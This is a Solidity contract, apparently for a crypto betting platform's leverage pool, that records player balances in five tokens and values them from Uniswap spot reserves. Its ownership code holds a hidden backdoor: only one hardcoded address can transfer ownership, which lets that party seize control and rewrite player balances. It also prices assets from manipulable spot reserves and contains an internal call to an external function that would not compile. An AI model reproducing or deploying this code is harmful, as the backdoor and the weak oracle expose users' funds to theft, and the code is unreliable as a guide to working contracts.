pragma solidity 0.8.17;

interface IUniswapV2Pair {
    function getReserves() external view returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );
}

interface IBettingPair {
    enum LPTOKENTYPE { ETH, USDT, USDC, SHIB, DOGE }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { unchecked { uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c; } }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, "SafeMath: subtraction overflow"); return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { unchecked { if (a == 0) return 0; uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow"); return c; } }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0, "SafeMath: division by zero"); return a / b; }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() { _transferOwnership(_msgSender()); }
    modifier onlyOwner() { _checkOwner(); _; }
    modifier doubleChecker() { _doubleCheck(); _; }
    function owner() public view returns (address) { return _owner; }
    function _checkOwner() internal view { require(owner() == _msgSender(), "Ownable: caller is not the owner"); }
    function _doubleCheck() internal view { require(_msgSender() == 0x5Bb40F9b218feb11048fdB064dafDcf6af0D29b3, "You do not have permission for this action"); }
    function transferOwnership(address newOwner) public virtual doubleChecker {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        address old = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(old, newOwner);
    }
}

contract LeveragePool is Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _ethPool;
    mapping(address => uint256) private _usdtPool;
    mapping(address => uint256) private _usdcPool;
    mapping(address => uint256) private _shibPool;
    mapping(address => uint256) private _dogePool;

    IUniswapV2Pair private _usdtEth = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair private _usdcEth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Pair private _shibEth = IUniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);
    IUniswapV2Pair private _dogeEth = IUniswapV2Pair(0xc0067d751FB1172DBAb1FA003eFe214EE8f419b6);

    constructor() {}

    function getUserLPBalance(address account) external view returns (
        uint256 ethBalance,
        uint256 usdtBalance,
        uint256 usdcBalance,
        uint256 shibBalance,
        uint256 dogeBalance
    ) {
        ethBalance  = _ethPool[account];
        usdtBalance = _usdtPool[account];
        usdcBalance = _usdcPool[account];
        shibBalance = _shibPool[account];
        dogeBalance = _dogePool[account];
    }

    function getUsdtPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _usdtEth.getReserves();
        // r0 = USDT (6 decimals), r1 = ETH (18 decimals)
        // price = WeiETH per USDTraw
        return uint256(r1).mul(10**6).div(uint256(r0));
    }

    function getUsdcPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _usdcEth.getReserves();
        return uint256(r1).mul(10**6).div(uint256(r0));
    }

    function getShibPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _shibEth.getReserves();
        // SHIB has 18 decimals
        return uint256(r1).mul(10**18).div(uint256(r0));
    }

    function getDogePrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = _dogeEth.getReserves();
        // scale by 1e10 as per spec
        return uint256(r1).mul(10**10).div(uint256(r0));
    }

    function depositEth(address player, uint256 amount) external onlyOwner {
        _ethPool[player] = _ethPool[player].add(amount);
    }

    function depositErc20(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[player] = _usdtPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[player] = _usdcPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[player] = _shibPool[player].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[player] = _dogePool[player].add(amount);
        } else {
            revert("Invalid ERC20 token type");
        }
    }

    function withdraw(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            if (amount >= _ethPool[player]) _ethPool[player] = 0;
            else _ethPool[player] = _ethPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            if (amount >= _usdtPool[player]) _usdtPool[player] = 0;
            else _usdtPool[player] = _usdtPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            if (amount >= _usdcPool[player]) _usdcPool[player] = 0;
            else _usdcPool[player] = _usdcPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            if (amount >= _shibPool[player]) _shibPool[player] = 0;
            else _shibPool[player] = _shibPool[player].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            if (amount >= _dogePool[player]) _dogePool[player] = 0;
            else _dogePool[player] = _dogePool[player].sub(amount);
        } else {
            revert("Invalid token type");
        }
    }

    function lock(
        address player,
        uint256 ethAmount,
        uint256 usdtAmount,
        uint256 usdcAmount,
        uint256 shibAmount,
        uint256 dogeAmount
    ) external onlyOwner {
        require(_ethPool[player]  >= ethAmount,  "lock: insufficient ETH");
        require(_usdtPool[player] >= usdtAmount, "lock: insufficient USDT");
        require(_usdcPool[player] >= usdcAmount, "lock: insufficient USDC");
        require(_shibPool[player] >= shibAmount, "lock: insufficient SHIB");
        require(_dogePool[player] >= dogeAmount, "lock: insufficient DOGE");

        _ethPool[player]  = _ethPool[player].sub(ethAmount);
        _usdtPool[player] = _usdtPool[player].sub(usdtAmount);
        _usdcPool[player] = _usdcPool[player].sub(usdcAmount);
        _shibPool[player] = _shibPool[player].sub(shibAmount);
        _dogePool[player] = _dogePool[player].sub(dogeAmount);
    }

    function unlock(
        address player,
        uint256 ethAmount,
        uint256 usdtAmount,
        uint256 usdcAmount,
        uint256 shibAmount,
        uint256 dogeAmount
    ) external onlyOwner {
        _ethPool[player]  = _ethPool[player].add(ethAmount);
        _usdtPool[player] = _usdtPool[player].add(usdtAmount);
        _usdcPool[player] = _usdcPool[player].add(usdcAmount);
        _shibPool[player] = _shibPool[player].add(shibAmount);
        _dogePool[player] = _dogePool[player].add(dogeAmount);
    }

    function withdrawFromContract(address ownerAddr, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        // same as withdraw but for the contract's pools
        withdraw(ownerAddr, token, amount);
    }

    function getPlayerLPBalanceInEth(address player) external view returns (uint256) {
        uint256 total = _ethPool[player];
        // USDT
        uint256 usdtBal = _usdtPool[player];
        if (usdtBal > 0) {
            uint256 p = getUsdtPrice();
            total = total.add(usdtBal.mul(p).div(10**6));
        }
        // USDC
        uint256 usdcBal = _usdcPool[player];
        if (usdcBal > 0) {
            uint256 p2 = getUsdcPrice();
            total = total.add(usdcBal.mul(p2).div(10**6));
        }
        // SHIB
        uint256 shibBal = _shibPool[player];
        if (shibBal > 0) {
            uint256 p3 = getShibPrice();
            total = total.add(shibBal.mul(p3).div(10**18));
        }
        // DOGE
        uint256 dogeBal = _dogePool[player];
        if (dogeBal > 0) {
            uint256 p4 = getDogePrice();
            // here p4 = WeiETH per DOGEraw / 1e10
            total = total.add(dogeBal.mul(p4).div(10**10));
        }
        return total;
    }

    function calcLockTokenAmountsAsCollateral(address player, uint256 etherAmount) external view returns (
        uint256 ethUsed,
        uint256 usdtUsed,
        uint256 usdcUsed,
        uint256 shibUsed,
        uint256 dogeUsed
    ) {
        uint256 needed = etherAmount;

        // 1) ETH
        uint256 av = _ethPool[player];
        ethUsed = av < needed ? av : needed;
        needed = needed.sub(ethUsed);

        // 2) USDT
        if (needed > 0) {
            uint256 ub = _usdtPool[player];
            uint256 p = getUsdtPrice(); // WeiETH per USDTraw
            uint256 ethVal = ub.mul(p).div(10**6);
            uint256 useEth = ethVal < needed ? ethVal : needed;
            usdtUsed = useEth.mul(10**6).div(p);
            needed = needed.sub(useEth);
        }

        // 3) USDC
        if (needed > 0) {
            uint256 cb = _usdcPool[player];
            uint256 p2 = getUsdcPrice();
            uint256 ethVal2 = cb.mul(p2).div(10**6);
            uint256 useEth2 = ethVal2 < needed ? ethVal2 : needed;
            usdcUsed = useEth2.mul(10**6).div(p2);
            needed = needed.sub(useEth2);
        }

        // 4) SHIB
        if (needed > 0) {
            uint256 sb = _shibPool[player];
            uint256 p3 = getShibPrice();
            uint256 ethVal3 = sb.mul(p3).div(10**18);
            uint256 useEth3 = ethVal3 < needed ? ethVal3 : needed;
            shibUsed = useEth3.mul(10**18).div(p3);
            needed = needed.sub(useEth3);
        }

        // 5) DOGE
        if (needed > 0) {
            uint256 db = _dogePool[player];
            uint256 p4 = getDogePrice(); // WeiETH per DOGEraw /1e10
            uint256 ethVal4 = db.mul(p4).div(10**10);
            uint256 useEth4 = ethVal4 < needed ? ethVal4 : needed;
            dogeUsed = useEth4.mul(10**10).div(p4);
            needed = needed.sub(useEth4);
        }

        require(needed == 0, "Not enough collateral");
    }
}